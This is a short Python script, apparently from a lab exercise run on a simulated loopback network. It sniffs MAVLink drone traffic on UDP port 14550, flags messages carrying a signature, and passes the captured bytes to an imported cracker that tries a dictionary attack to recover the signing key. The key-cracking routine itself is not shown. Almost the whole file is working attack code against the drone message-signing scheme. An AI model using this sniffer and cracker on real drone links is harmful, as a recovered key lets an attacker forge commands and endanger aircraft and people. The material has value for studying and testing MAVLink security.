from scapy.all import sniff, UDP
from cracker import crack
from pymavlink import mavutil
import os
from cracker import crack

# Without this, the sniffer won't know how to read the signature bytes!
os.environ["MAVLINK20"] = "1"

# Connect to the snooping port
mav = mavutil.mavlink.MAVLink(None)

def packet_callback(packet):
    # Check if the packet has a UDP layer
    # Scapy captures anything (Ethernet -> IP -> UDP), so this checks
    # if we have UDP data inside.
    if packet.haslayer(UDP):

        # We only care about traffic going TO or FROM port 14550
	# .sport = Source Port, .dport = Destination Port
        if packet[UDP].sport == 14550 or packet[UDP].dport == 14550:

            # Extract the raw payload (the MAVLink bytes)
	    # packet[UDP].payload is the actual MAVLink message, we
	    # convert it to standard python bytes.
            raw_data = bytes(packet[UDP].payload)

            # Print minimal info (Length of data)
            print(f"Captured Packet: {len(raw_data)} bytes | Source Port: {packet[UDP].sport}")

            try:
                # Parse the message
                msgs = mav.parse_buffer(raw_data)
                if msgs:
                    for msg in msgs:
                        # CHECK FOR SIGNING
                        # Check if the "Signature Flag" is flipped on
                        is_signed = msg._header.incompat_flags & mavutil.mavlink.MAVLINK_IFLAG_SIGNED

                        if is_signed:
                            print(f"\n[SNIFFER] WARNING: Message {msg.get_type()} is SIGNED! (Key is active)")
                            print("[SNIFFER] Capturing packet and initiating Dictionary Attack...")

                            # Feed the raw bytes we captured into your cracker
                            recovered_key = crack(raw_data)

                            if recovered_key:
                                print(f"\n[SUCCESS] CRITICAL BREACH! Password found: {recovered_key}")
                            else:
                                print("\n[FAILED] Password not found in dictionary.")
                                
                        else:
                            print(f"[SNIFFER] Message {msg.get_type()} is UNSIGNED (No Key used)")

            except Exception as e:
                print(e)

# Start Sniffing
# iface="lo" -> Listen on Loopback (my internal simulation network)
# filter="udp port 14550" -> Only capture drone traffic
# store=0 -> Don't keep packets in RAM
print("Starting Sniffer... (Ctrl+C to stop)")
sniff(iface="lo", filter="udp port 14550", prn=packet_callback, store=0)
